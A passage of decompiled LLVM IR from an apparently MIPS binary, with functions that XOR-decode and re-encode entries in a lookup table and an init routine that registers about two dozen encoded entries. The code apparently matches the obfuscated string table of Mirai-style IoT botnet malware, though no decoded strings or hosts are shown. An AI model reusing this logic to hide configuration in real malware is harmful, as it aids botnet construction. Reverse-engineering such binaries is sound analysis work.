  %v0_40034c = load i32, i32* %a0.global-to-local, align 4
  %v2_40034c = add i32 %v0_40034c, %v3_400344
  %v1_400350 = inttoptr i32 %v2_40034c to i8*
  %v2_400350 = load i8, i8* %v1_400350, align 1
  %v3_400350 = zext i8 %v2_400350 to i32
  %v1_400358 = load i32, i32* @a3, align 4
  %v2_400358 = xor i32 %v1_400358, %v3_400350
  store i32 %v2_400358, i32* %v0.global-to-local, align 4
  %v1_40035c = trunc i32 %v2_400358 to i8
  store i8 %v1_40035c, i8* %v1_400350, align 1
  %v0_400360 = load i32, i32* %a1.global-to-local, align 4
  %v1_400360 = add i32 %v0_400360, 4
  %v2_400360 = inttoptr i32 %v1_400360 to i32*
  %v3_400360 = load i32, i32* %v2_400360, align 4
  %v0_400368 = load i32, i32* %a0.global-to-local, align 4
  %v2_400368 = add i32 %v0_400368, %v3_400360
  %v1_40036c = inttoptr i32 %v2_400368 to i8*
  %v2_40036c = load i8, i8* %v1_40036c, align 1
  %v3_40036c = zext i8 %v2_40036c to i32
  %v1_400374 = load i32, i32* %a2.global-to-local, align 4
  %v2_400374 = xor i32 %v1_400374, %v3_40036c
  store i32 %v2_400374, i32* %v0.global-to-local, align 4
  %v1_400378 = trunc i32 %v2_400374 to i8
  store i8 %v1_400378, i8* %v1_40036c, align 1
  %v0_40037c = load i32, i32* %a1.global-to-local, align 4
  %v1_40037c = add i32 %v0_40037c, 4
  %v2_40037c = inttoptr i32 %v1_40037c to i32*
  %v3_40037c = load i32, i32* %v2_40037c, align 4
  %v0_400384 = load i32, i32* %a0.global-to-local, align 4
  %v2_400384 = add i32 %v0_400384, %v3_40037c
  %v1_400388 = inttoptr i32 %v2_400384 to i8*
  %v2_400388 = load i8, i8* %v1_400388, align 1
  %v3_400388 = zext i8 %v2_400388 to i32
  %v1_40038c = add i32 %v0_400384, 1
  store i32 %v1_40038c, i32* %a0.global-to-local, align 4
  %v1_400390 = load i32, i32* %a2.global-to-local, align 4
  %v2_400390 = xor i32 %v1_400390, %v3_400388
  store i32 %v2_400390, i32* %v0.global-to-local, align 4
  %v1_400394 = trunc i32 %v2_400390 to i8
  store i8 %v1_400394, i8* %v1_400388, align 1
  %v0_400398 = load i32, i32* %a1.global-to-local, align 4
  %v1_400398 = add i32 %v0_400398, 8
  %v2_400398 = inttoptr i32 %v1_400398 to i16*
  %v3_400398 = load i16, i16* %v2_400398, align 2
  %v4_400398 = zext i16 %v3_400398 to i32
  %v0_4003a0 = load i32, i32* %a0.global-to-local, align 4
  %v2_4003a0 = icmp slt i32 %v0_4003a0, %v4_400398
  %v3_4003a0 = zext i1 %v2_4003a0 to i32
  store i32 %v3_4003a0, i32* %v0.global-to-local, align 4
  br i1 %v2_4003a0, label %dec_label_pc_400328.dec_label_pc_400328_crit_edge, label %dec_label_pc_4003a8

dec_label_pc_400328.dec_label_pc_400328_crit_edge: ; preds = %dec_label_pc_400328
  %v1_40033c.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400328

dec_label_pc_4003a8:                              ; preds = %dec_label_pc_400328
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4003b4

dec_label_pc_4003b4:                              ; preds = %dec_label_pc_4003b4, %dec_label_pc_4003a8
  %v0_4003bc = phi i32 [ %v1_4003dc, %dec_label_pc_4003b4 ], [ 0, %dec_label_pc_4003a8 ]
  %v0_4003b4 = phi i32 [ %v0_4003e0, %dec_label_pc_4003b4 ], [ %v0_400398, %dec_label_pc_4003a8 ]
  %v1_4003b4 = add i32 %v0_4003b4, 4
  %v2_4003b4 = inttoptr i32 %v1_4003b4 to i32*
  %v3_4003b4 = load i32, i32* %v2_4003b4, align 4
  %v2_4003bc = add i32 %v3_4003b4, %v0_4003bc
  store i32 %v2_4003bc, i32* %v0.global-to-local, align 4
  %v1_4003c0 = add i32 %v2_4003bc, 1
  %v2_4003c0 = inttoptr i32 %v1_4003c0 to i8*
  %v3_4003c0 = load i8, i8* %v2_4003c0, align 1
  %v1_4003c4 = inttoptr i32 %v2_4003bc to i8*
  %v2_4003c4 = load i8, i8* %v1_4003c4, align 1
  %v3_4003c4 = sext i8 %v2_4003c4 to i32
  store i32 %v3_4003c4, i32* %a0.global-to-local, align 4
  store i8 %v3_4003c0, i8* %v1_4003c4, align 1
  %v0_4003cc = load i32, i32* %a1.global-to-local, align 4
  %v1_4003cc = add i32 %v0_4003cc, 4
  %v2_4003cc = inttoptr i32 %v1_4003cc to i32*
  %v3_4003cc = load i32, i32* %v2_4003cc, align 4
  %v1_4003d4 = load i32, i32* %a2.global-to-local, align 4
  %v2_4003d4 = add i32 %v1_4003d4, %v3_4003cc
  store i32 %v2_4003d4, i32* %v0.global-to-local, align 4
  %v0_4003d8 = load i32, i32* %a0.global-to-local, align 4
  %v1_4003d8 = trunc i32 %v0_4003d8 to i8
  %v3_4003d8 = add i32 %v2_4003d4, 1
  %v4_4003d8 = inttoptr i32 %v3_4003d8 to i8*
  store i8 %v1_4003d8, i8* %v4_4003d8, align 1
  %v0_4003dc = load i32, i32* %a2.global-to-local, align 4
  %v1_4003dc = add i32 %v0_4003dc, 2
  store i32 %v1_4003dc, i32* %a2.global-to-local, align 4
  %v0_4003e0 = load i32, i32* %a1.global-to-local, align 4
  %v1_4003e0 = add i32 %v0_4003e0, 8
  %v2_4003e0 = inttoptr i32 %v1_4003e0 to i16*
  %v3_4003e0 = load i16, i16* %v2_4003e0, align 2
  %v4_4003e0 = zext i16 %v3_4003e0 to i32
  %v2_4003e8 = icmp slt i32 %v1_4003dc, %v4_4003e0
  %v3_4003e8 = zext i1 %v2_4003e8 to i32
  store i32 %v3_4003e8, i32* %v0.global-to-local, align 4
  br i1 %v2_4003e8, label %dec_label_pc_4003b4, label %dec_label_pc_4003f0

dec_label_pc_4003f0:                              ; preds = %dec_label_pc_4003b4
  %v2_4003f4 = add i32 %v0_4003e0, 10
  %v3_4003f4 = inttoptr i32 %v2_4003f4 to i8*
  store i8 0, i8* %v3_4003f4, align 1
  ret i32 %v3_4003e8

dec_label_pc_4003fc:                              ; preds = %dec_label_pc_4002f0
  %v1_4003fc = add i32 %v0_400308, 12
  %v2_4003fc = inttoptr i32 %v1_4003fc to i32*
  %v3_4003fc = load i32, i32* %v2_4003fc, align 4
  store i32 %v3_4003fc, i32* %a1.global-to-local, align 4
  %v1_400404 = icmp eq i32 %v3_4003fc, 0
  br i1 %v1_400404, label %dec_label_pc_400408, label %dec_label_pc_4002f0

dec_label_pc_400408:                              ; preds = %dec_label_pc_4003fc
  store i8 0, i8* inttoptr (i32 10 to i8*), align 2
  %v1_400410.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400410

dec_label_pc_400410:                              ; preds = %dec_label_pc_400304, %dec_label_pc_400408
  %v1_400410 = phi i32 [ %v4_400308, %dec_label_pc_400304 ], [ %v1_400410.pre, %dec_label_pc_400408 ]
  ret i32 %v1_400410

; uselistorder directives
  uselistorder i32 %v3_4003fc, { 1, 2, 0 }
  uselistorder i32 %v0_4003e0, { 0, 2, 1 }
  uselistorder i32 %v1_4003dc, { 0, 2, 1 }
  uselistorder i32 %v0_4003a0, { 1, 0 }
  uselistorder i32 %v0_400398, { 0, 2, 1 }
  uselistorder i32 %v0_400384, { 1, 0 }
  uselistorder i32 %v2_4002f0, { 1, 0, 2 }
  uselistorder i32 %v0_400308, { 2, 0, 1, 3 }
  uselistorder i32 %v1_4002ec, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 9, 7, 0, 1, 2, 3, 4, 5, 6, 8, 10, 11 }
  uselistorder i32* %a2.global-to-local, { 6, 5, 4, 0, 1, 2, 3 }
  uselistorder i32* %a1.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder label %dec_label_pc_400410, { 1, 0 }
}

define i32 @function_400418(i32 %arg1) local_unnamed_addr {
dec_label_pc_400418:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_400424 = load i32, i32* bitcast (i32** @global_var_449b58.13 to i32*), align 4
  store i32 %v3_400424, i32* %v0.global-to-local, align 4
  store i32 %v3_400424, i32* %a1.global-to-local, align 4
  %v1_400434 = urem i32 %arg1, 256
  store i32 %v1_400434, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_400438

dec_label_pc_400438:                              ; preds = %dec_label_pc_400548, %dec_label_pc_400418
  %v0_400450 = phi i32 [ %v3_400548, %dec_label_pc_400548 ], [ %v3_400424, %dec_label_pc_400418 ]
  %v1_400438 = inttoptr i32 %v0_400450 to i32*
  %v2_400438 = load i32, i32* %v1_400438, align 4
  store i32 %v2_400438, i32* %v0.global-to-local, align 4
  %v1_400440 = icmp sgt i32 %v2_400438, 0
  %v2_400448 = icmp eq i32 %v1_400434, %v2_400438
  %or.cond = and i1 %v1_400440, %v2_400448
  br i1 %or.cond, label %dec_label_pc_40044c, label %dec_label_pc_400548

dec_label_pc_40044c:                              ; preds = %dec_label_pc_400438
  %v1_400450 = add i32 %v0_400450, 10
  %v2_400450 = inttoptr i32 %v1_400450 to i8*
  %v3_400450 = load i8, i8* %v2_400450, align 1
  %v4_400450 = sext i8 %v3_400450 to i32
  store i32 %v4_400450, i32* %v0.global-to-local, align 4
  %v1_400458 = icmp eq i8 %v3_400450, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400458, label %dec_label_pc_40045c, label %dec_label_pc_40055c

dec_label_pc_40045c:                              ; preds = %dec_label_pc_40044c
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400470

dec_label_pc_400470:                              ; preds = %dec_label_pc_400470.dec_label_pc_400470_crit_edge, %dec_label_pc_40045c
  %v1_400484 = phi i32 [ %v1_400484.pre, %dec_label_pc_400470.dec_label_pc_400470_crit_edge ], [ -19, %dec_label_pc_40045c ]
  %v0_400478 = phi i32 [ %v0_4004e8, %dec_label_pc_400470.dec_label_pc_400470_crit_edge ], [ 0, %dec_label_pc_40045c ]
  %v0_400470 = phi i32 [ %v0_4004e0, %dec_label_pc_400470.dec_label_pc_400470_crit_edge ], [ %v0_400450, %dec_label_pc_40045c ]
  %v1_400470 = add i32 %v0_400470, 4
  %v2_400470 = inttoptr i32 %v1_400470 to i32*
  %v3_400470 = load i32, i32* %v2_400470, align 4
  %v2_400478 = add i32 %v3_400470, %v0_400478
  %v1_40047c = inttoptr i32 %v2_400478 to i8*
  %v2_40047c = load i8, i8* %v1_40047c, align 1
  %v3_40047c = zext i8 %v2_40047c to i32
  %v2_400484 = xor i32 %v3_40047c, %v1_400484
  store i32 %v2_400484, i32* %v0.global-to-local, align 4
  %v1_400488 = trunc i32 %v2_400484 to i8
  store i8 %v1_400488, i8* %v1_40047c, align 1
  %v0_40048c = load i32, i32* %a1.global-to-local, align 4
  %v1_40048c = add i32 %v0_40048c, 4
  %v2_40048c = inttoptr i32 %v1_40048c to i32*
  %v3_40048c = load i32, i32* %v2_40048c, align 4
  %v0_400494 = load i32, i32* %a0.global-to-local, align 4
  %v2_400494 = add i32 %v0_400494, %v3_40048c
  %v1_400498 = inttoptr i32 %v2_400494 to i8*
  %v2_400498 = load i8, i8* %v1_400498, align 1
  %v3_400498 = zext i8 %v2_400498 to i32
  %v1_4004a0 = load i32, i32* @a3, align 4
  %v2_4004a0 = xor i32 %v1_4004a0, %v3_400498
  store i32 %v2_4004a0, i32* %v0.global-to-local, align 4
  %v1_4004a4 = trunc i32 %v2_4004a0 to i8
  store i8 %v1_4004a4, i8* %v1_400498, align 1
  %v0_4004a8 = load i32, i32* %a1.global-to-local, align 4
  %v1_4004a8 = add i32 %v0_4004a8, 4
  %v2_4004a8 = inttoptr i32 %v1_4004a8 to i32*
  %v3_4004a8 = load i32, i32* %v2_4004a8, align 4
  %v0_4004b0 = load i32, i32* %a0.global-to-local, align 4
  %v2_4004b0 = add i32 %v0_4004b0, %v3_4004a8
  %v1_4004b4 = inttoptr i32 %v2_4004b0 to i8*
  %v2_4004b4 = load i8, i8* %v1_4004b4, align 1
  %v3_4004b4 = zext i8 %v2_4004b4 to i32
  %v1_4004bc = load i32, i32* %a2.global-to-local, align 4
  %v2_4004bc = xor i32 %v1_4004bc, %v3_4004b4
  store i32 %v2_4004bc, i32* %v0.global-to-local, align 4
  %v1_4004c0 = trunc i32 %v2_4004bc to i8
  store i8 %v1_4004c0, i8* %v1_4004b4, align 1
  %v0_4004c4 = load i32, i32* %a1.global-to-local, align 4
  %v1_4004c4 = add i32 %v0_4004c4, 4
  %v2_4004c4 = inttoptr i32 %v1_4004c4 to i32*
  %v3_4004c4 = load i32, i32* %v2_4004c4, align 4
  %v0_4004cc = load i32, i32* %a0.global-to-local, align 4
  %v2_4004cc = add i32 %v0_4004cc, %v3_4004c4
  %v1_4004d0 = inttoptr i32 %v2_4004cc to i8*
  %v2_4004d0 = load i8, i8* %v1_4004d0, align 1
  %v3_4004d0 = zext i8 %v2_4004d0 to i32
  %v1_4004d4 = add i32 %v0_4004cc, 1
  store i32 %v1_4004d4, i32* %a0.global-to-local, align 4
  %v1_4004d8 = load i32, i32* %a2.global-to-local, align 4
  %v2_4004d8 = xor i32 %v1_4004d8, %v3_4004d0
  store i32 %v2_4004d8, i32* %v0.global-to-local, align 4
  %v1_4004dc = trunc i32 %v2_4004d8 to i8
  store i8 %v1_4004dc, i8* %v1_4004d0, align 1
  %v0_4004e0 = load i32, i32* %a1.global-to-local, align 4
  %v1_4004e0 = add i32 %v0_4004e0, 8
  %v2_4004e0 = inttoptr i32 %v1_4004e0 to i16*
  %v3_4004e0 = load i16, i16* %v2_4004e0, align 2
  %v4_4004e0 = zext i16 %v3_4004e0 to i32
  %v0_4004e8 = load i32, i32* %a0.global-to-local, align 4
  %v2_4004e8 = icmp slt i32 %v0_4004e8, %v4_4004e0
  %v3_4004e8 = zext i1 %v2_4004e8 to i32
  store i32 %v3_4004e8, i32* %v0.global-to-local, align 4
  br i1 %v2_4004e8, label %dec_label_pc_400470.dec_label_pc_400470_crit_edge, label %dec_label_pc_4004f0

dec_label_pc_400470.dec_label_pc_400470_crit_edge: ; preds = %dec_label_pc_400470
  %v1_400484.pre = load i32, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_400470

dec_label_pc_4004f0:                              ; preds = %dec_label_pc_400470
  store i32 0, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4004fc

dec_label_pc_4004fc:                              ; preds = %dec_label_pc_4004fc, %dec_label_pc_4004f0
  %v0_400504 = phi i32 [ %v1_400524, %dec_label_pc_4004fc ], [ 0, %dec_label_pc_4004f0 ]
  %v0_4004fc = phi i32 [ %v0_400528, %dec_label_pc_4004fc ], [ %v0_4004e0, %dec_label_pc_4004f0 ]
  %v1_4004fc = add i32 %v0_4004fc, 4
  %v2_4004fc = inttoptr i32 %v1_4004fc to i32*
  %v3_4004fc = load i32, i32* %v2_4004fc, align 4
  %v2_400504 = add i32 %v3_4004fc, %v0_400504
  store i32 %v2_400504, i32* %v0.global-to-local, align 4
  %v1_400508 = add i32 %v2_400504, 1
  %v2_400508 = inttoptr i32 %v1_400508 to i8*
  %v3_400508 = load i8, i8* %v2_400508, align 1
  %v1_40050c = inttoptr i32 %v2_400504 to i8*
  %v2_40050c = load i8, i8* %v1_40050c, align 1
  %v3_40050c = sext i8 %v2_40050c to i32
  store i32 %v3_40050c, i32* %a0.global-to-local, align 4
  store i8 %v3_400508, i8* %v1_40050c, align 1
  %v0_400514 = load i32, i32* %a1.global-to-local, align 4
  %v1_400514 = add i32 %v0_400514, 4
  %v2_400514 = inttoptr i32 %v1_400514 to i32*
  %v3_400514 = load i32, i32* %v2_400514, align 4
  %v1_40051c = load i32, i32* %a2.global-to-local, align 4
  %v2_40051c = add i32 %v1_40051c, %v3_400514
  store i32 %v2_40051c, i32* %v0.global-to-local, align 4
  %v0_400520 = load i32, i32* %a0.global-to-local, align 4
  %v1_400520 = trunc i32 %v0_400520 to i8
  %v3_400520 = add i32 %v2_40051c, 1
  %v4_400520 = inttoptr i32 %v3_400520 to i8*
  store i8 %v1_400520, i8* %v4_400520, align 1
  %v0_400524 = load i32, i32* %a2.global-to-local, align 4
  %v1_400524 = add i32 %v0_400524, 2
  store i32 %v1_400524, i32* %a2.global-to-local, align 4
  %v0_400528 = load i32, i32* %a1.global-to-local, align 4
  %v1_400528 = add i32 %v0_400528, 8
  %v2_400528 = inttoptr i32 %v1_400528 to i16*
  %v3_400528 = load i16, i16* %v2_400528, align 2
  %v4_400528 = zext i16 %v3_400528 to i32
  %v1_400530 = add nsw i32 %v4_400528, -1
  %v2_400534 = icmp slt i32 %v1_400524, %v1_400530
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_400534, label %dec_label_pc_4004fc, label %dec_label_pc_40053c

dec_label_pc_40053c:                              ; preds = %dec_label_pc_4004fc
  %v5_400540 = add i32 %v0_400528, 10
  %v6_400540 = inttoptr i32 %v5_400540 to i8*
  store i8 1, i8* %v6_400540, align 1
  ret i32 1

dec_label_pc_400548:                              ; preds = %dec_label_pc_400438
  %v1_400548 = add i32 %v0_400450, 12
  %v2_400548 = inttoptr i32 %v1_400548 to i32*
  %v3_400548 = load i32, i32* %v2_400548, align 4
  store i32 %v3_400548, i32* %a1.global-to-local, align 4
  %v1_400550 = icmp eq i32 %v3_400548, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_400550, label %dec_label_pc_400554, label %dec_label_pc_400438

dec_label_pc_400554:                              ; preds = %dec_label_pc_400548
  store i8 1, i8* inttoptr (i32 10 to i8*), align 2
  %v1_40055c.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40055c

dec_label_pc_40055c:                              ; preds = %dec_label_pc_40044c, %dec_label_pc_400554
  %v1_40055c = phi i32 [ %v4_400450, %dec_label_pc_40044c ], [ %v1_40055c.pre, %dec_label_pc_400554 ]
  ret i32 %v1_40055c

; uselistorder directives
  uselistorder i32 %v3_400548, { 1, 2, 0 }
  uselistorder i32 %v0_400528, { 0, 2, 1 }
  uselistorder i32 %v1_400524, { 0, 2, 1 }
  uselistorder i32 %v0_4004e8, { 1, 0 }
  uselistorder i32 %v0_4004e0, { 0, 2, 1 }
  uselistorder i32 %v0_4004cc, { 1, 0 }
  uselistorder i32 %v2_400438, { 1, 0, 2 }
  uselistorder i32 %v0_400450, { 2, 0, 1, 3 }
  uselistorder i32 %v1_400434, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_40055c, { 1, 0 }
}

define i32 @function_400564(i32 %arg1) local_unnamed_addr {
dec_label_pc_400564:
  %v3_400570 = load i32, i32* bitcast (i32** @global_var_449b58.13 to i32*), align 4
  %v1_400580 = urem i32 %arg1, 256
  br label %dec_label_pc_400584

dec_label_pc_400584:                              ; preds = %dec_label_pc_40059c, %dec_label_pc_400564
  %v0_4005b4 = phi i32 [ %v3_40059c, %dec_label_pc_40059c ], [ %v3_400570, %dec_label_pc_400564 ]
  %v1_400584 = inttoptr i32 %v0_4005b4 to i32*
  %v2_400584 = load i32, i32* %v1_400584, align 4
  %v1_40058c = icmp sgt i32 %v2_400584, 0
  %v2_400594 = icmp eq i32 %v1_400580, %v2_400584
  %or.cond = and i1 %v1_40058c, %v2_400594
  br i1 %or.cond, label %dec_label_pc_4005b4, label %dec_label_pc_40059c

dec_label_pc_40059c:                              ; preds = %dec_label_pc_400584
  %v1_40059c = add i32 %v0_4005b4, 12
  %v2_40059c = inttoptr i32 %v1_40059c to i32*
  %v3_40059c = load i32, i32* %v2_40059c, align 4
  %v1_4005a4 = icmp eq i32 %v3_40059c, 0
  br i1 %v1_4005a4, label %dec_label_pc_4005a8, label %dec_label_pc_400584

dec_label_pc_4005a8:                              ; preds = %dec_label_pc_40059c
  ret i32 0

dec_label_pc_4005b4:                              ; preds = %dec_label_pc_400584
  %v1_4005b4 = add i32 %v0_4005b4, 4
  %v2_4005b4 = inttoptr i32 %v1_4005b4 to i32*
  %v3_4005b4 = load i32, i32* %v2_4005b4, align 4
  ret i32 %v3_4005b4

; uselistorder directives
  uselistorder i32 %v3_40059c, { 1, 0 }
  uselistorder i32 %v2_400584, { 1, 0 }
}

define i32 @function_4005c0() local_unnamed_addr {
dec_label_pc_4005c0:
  %v1_4005e0 = call i32 @unknown_0()
  %v1_4005ec = inttoptr i32 %v1_4005e0 to i32*
  store i32 0, i32* %v1_4005ec, align 4
  %v3_4005f0 = load i32, i32* bitcast (i32** @global_var_449c14.16 to i32*), align 4
  %v2_4005f8 = inttoptr i32 %v3_4005f0 to i32*
  store i32 %v1_4005e0, i32* %v2_4005f8, align 4
  %v3_4005fc = load i32, i32* bitcast (i32** @global_var_449b58.13 to i32*), align 4
  %v2_400604 = inttoptr i32 %v3_4005fc to i32*
  store i32 %v1_4005e0, i32* %v2_400604, align 4
  %v1_400608 = add i32 %v1_4005e0, 12
  %v2_400608 = inttoptr i32 %v1_400608 to i32*
  store i32 0, i32* %v2_400608, align 4
  ret i32 %v1_4005e0

; uselistorder directives
  uselistorder i32 %v1_4005e0, { 0, 2, 1, 3, 4 }
}

define i32 @function_40061c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40061c:
  %s3.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %v0_400634 = load i32, i32* @s2, align 4
  %v0_400638 = load i32, i32* @s1, align 4
  %v0_40063c = load i32, i32* @s0, align 4
  store i32 %arg1, i32* @s2, align 4
  %v1_400650 = urem i32 %arg2, 65536
  store i32 %v1_400650, i32* @s1, align 4
  store i32 %arg3, i32* %s3.global-to-local, align 4
  %v2_400654 = call i32 @unknown_0()
  %v0_400660 = load i32, i32* @s1, align 4
  %v3_400664 = load i32, i32* @global_var_449cb8.14, align 4
  store i32 %v3_400664, i32* @t9, align 4
  %v0_400668 = load i32, i32* @s2, align 4
  %v2_400668 = inttoptr i32 %v2_400654 to i32*
  store i32 %v0_400668, i32* %v2_400668, align 4
  store i32 %v2_400654, i32* @s0, align 4
  %v3_40066c = call i32 @function_406200(i32 %v0_400660)
  store i32 %v3_40066c, i32* @v0, align 4
  %v1_400678 = load i32, i32* @s0, align 4
  %v2_400678 = add i32 %v1_400678, 4
  %v3_400678 = inttoptr i32 %v2_400678 to i32*
  store i32 %v3_40066c, i32* %v3_400678, align 4
  %v3_40067c = load i32, i32* @global_var_449bec.17, align 4
  store i32 %v3_40067c, i32* @t9, align 4
  %v0_400684 = load i32, i32* %s3.global-to-local, align 4
  %v1_400688 = load i32, i32* @s1, align 4
  %v5_400688 = call i32 @function_403fa0(i32 %v3_40066c, i32 %v0_400684, i32 %v1_400688)
  %v3_400698 = load i32, i32* bitcast (i32** @global_var_449c14.16 to i32*), align 4
  store i32 %v3_400698, i32* %v1.global-to-local, align 4
  %v0_40069c = load i32, i32* @s1, align 4
  %v1_40069c = trunc i32 %v0_40069c to i16
  %v2_40069c = load i32, i32* @s0, align 4
  %v3_40069c = add i32 %v2_40069c, 8
  %v4_40069c = inttoptr i32 %v3_40069c to i16*
  store i16 %v1_40069c, i16* %v4_40069c, align 2
  %v3_4006a4 = load i32, i32* @s0, align 4
  %v4_4006a4 = add i32 %v3_4006a4, 10
  %v5_4006a4 = inttoptr i32 %v4_4006a4 to i8*
  store i8 -1, i8* %v5_4006a4, align 1
  %v0_4006a8 = load i32, i32* @s0, align 4
  %v1_4006a8 = add i32 %v0_4006a8, 12
  %v2_4006a8 = inttoptr i32 %v1_4006a8 to i32*
  store i32 0, i32* %v2_4006a8, align 4
  %v0_4006ac = load i32, i32* @s0, align 4
  store i32 %v0_4006ac, i32* @global_var_449c20.18, align 4
  %v1_4006b0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4006b0 = inttoptr i32 %v1_4006b0 to i32*
  store i32 %v0_4006ac, i32* %v2_4006b0, align 4
  store i32 %v0_400634, i32* @s2, align 4
  store i32 %v0_400638, i32* @s1, align 4
  store i32 %v0_40063c, i32* @s0, align 4
  ret i32 -1
}

define i32 @function_4006d0() local_unnamed_addr {
dec_label_pc_4006d0:
  %v3_4006e8 = load i32, i32* @global_var_449c24.19, align 4
  store i32 %v3_4006e8, i32* @t9, align 4
  %v1_4006f0 = call i32 @function_4005c0()
  %v3_400704 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400704, i32* @t9, align 4
  %v4_40070c = call i32 @function_40061c(i32 1, i32 21, i32 ptrtoint (i32* @global_var_408350.21 to i32))
  %v3_400720 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400720, i32* @t9, align 4
  %v4_400728 = call i32 @function_40061c(i32 2, i32 21, i32 ptrtoint (i32* @global_var_408368.22 to i32))
  %v3_40073c = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_40073c, i32* @t9, align 4
  %v4_400744 = call i32 @function_40061c(i32 3, i32 7, i32 ptrtoint (i32* @global_var_408380.23 to i32))
  %v3_400758 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400758, i32* @t9, align 4
  %v4_400760 = call i32 @function_40061c(i32 4, i32 6, i32 ptrtoint (i32* @global_var_408388.24 to i32))
  %v3_400774 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400774, i32* @t9, align 4
  %v4_40077c = call i32 @function_40061c(i32 5, i32 5, i32 ptrtoint (i32* @global_var_408390.25 to i32))
  %v3_400790 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400790, i32* @t9, align 4
  %v4_400798 = call i32 @function_40061c(i32 6, i32 14, i32 ptrtoint (i32* @global_var_408398.26 to i32))
  %v3_4007ac = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4007ac, i32* @t9, align 4
  %v4_4007b4 = call i32 @function_40061c(i32 7, i32 4, i32 ptrtoint (i32* @global_var_4083a8.27 to i32))
  %v3_4007c8 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4007c8, i32* @t9, align 4
  %v4_4007d0 = call i32 @function_40061c(i32 8, i32 17, i32 ptrtoint (i32* @global_var_4083b0.28 to i32))
  %v3_4007e4 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4007e4, i32* @t9, align 4
  %v4_4007ec = call i32 @function_40061c(i32 9, i32 10, i32 ptrtoint (i32* @global_var_4083c4.29 to i32))
  %v3_400800 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400800, i32* @t9, align 4
  %v4_400808 = call i32 @function_40061c(i32 10, i32 8, i32 ptrtoint (i32* @global_var_4083d0.30 to i32))
  %v3_40081c = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_40081c, i32* @t9, align 4
  %v4_400824 = call i32 @function_40061c(i32 11, i32 13, i32 ptrtoint (i32* @global_var_4083dc.31 to i32))
  %v3_400838 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400838, i32* @t9, align 4
  %v4_400840 = call i32 @function_40061c(i32 12, i32 11, i32 ptrtoint (i32* @global_var_4083ec.32 to i32))
  %v3_400854 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400854, i32* @t9, align 4
  %v4_40085c = call i32 @function_40061c(i32 13, i32 15, i32 ptrtoint (i32* @global_var_4083f8.33 to i32))
  %v3_400870 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400870, i32* @t9, align 4
  %v4_400878 = call i32 @function_40061c(i32 14, i32 10, i32 ptrtoint (i32* @global_var_408408.34 to i32))
  %v3_40088c = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_40088c, i32* @t9, align 4
  %v4_400894 = call i32 @function_40061c(i32 15, i32 10, i32 ptrtoint (i32* @global_var_408414.35 to i32))
  %v3_4008a8 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4008a8, i32* @t9, align 4
  %v4_4008b0 = call i32 @function_40061c(i32 16, i32 23, i32 ptrtoint (i32* @global_var_408420.36 to i32))
  %v3_4008c4 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4008c4, i32* @t9, align 4
  %v4_4008cc = call i32 @function_40061c(i32 17, i32 33, i32 ptrtoint (i32* @global_var_408438.37 to i32))
  %v3_4008e0 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4008e0, i32* @t9, align 4
  %v4_4008e8 = call i32 @function_40061c(i32 18, i32 23, i32 ptrtoint (i32* @global_var_40845c.38 to i32))
  %v3_4008fc = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_4008fc, i32* @t9, align 4
  %v4_400904 = call i32 @function_40061c(i32 19, i32 8, i32 ptrtoint (i32* @global_var_408474.39 to i32))
  %v3_400918 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400918, i32* @t9, align 4
  %v4_400920 = call i32 @function_40061c(i32 20, i32 8, i32 ptrtoint (i32* @global_var_408480.40 to i32))
  %v3_400934 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400934, i32* @t9, align 4
  %v4_40093c = call i32 @function_40061c(i32 21, i32 23, i32 ptrtoint (i32* @global_var_40848c.41 to i32))
  %v3_400950 = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_400950, i32* @t9, align 4
  %v4_400958 = call i32 @function_40061c(i32 22, i32 10, i32 ptrtoint (i32* @global_var_4084a4.42 to i32))
  %v3_40096c = load i32, i32* @global_var_449c0c.20, align 4
  store i32 %v3_40096c, i32* @t9, align 4
